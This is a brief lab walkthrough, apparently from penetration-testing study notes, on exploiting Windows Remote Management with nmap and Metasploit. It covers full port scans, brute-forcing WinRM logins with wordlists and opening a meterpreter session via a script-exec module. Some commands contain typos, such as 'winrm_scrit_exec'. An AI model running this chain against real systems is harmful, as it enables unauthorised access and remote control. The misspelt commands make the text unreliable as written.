# Exploiting WinRM (Windows Remote Management Protocol)

## Practice Demo

Enumerate the target using the db\_nmamp command

* <mark style="color:yellow;">db\_nmap -sS -sV -O targetIP</mark>

We did not identify the WinRM because it is out of the 1000 most common ports, so we enumerate all TCP ports:

* <mark style="color:yellow;">db\_nmap -sS -sV-O -p- targetIP</mark>

<figure><img src="../../.gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>

### Check the authentication methods supported by <mark style="color:yellow;">WinRm on the target</mark>

* <mark style="color:yellow;">auxiliary/scanner/winrm/winrm\_auth\_method</mark>

#### Perform a brute force

* <mark style="color:yellow;">auxiliary/scanner/winrm/winrm\_login</mark>&#x20;

Use the wordlists: common\_users.txt and unix\_passwords.txt

#### Testing if the credentials work

* <mark style="color:yellow;">auxiliary/scanner/winrm/winrm\_cmd</mark>

Set the required options

#### Obtain a meterpreter session through WinRM

* <mark style="color:yellow;">exploit/windows/winrm/winrm\_scrit\_exec</mark>

We set the FORCE\_VBS to true
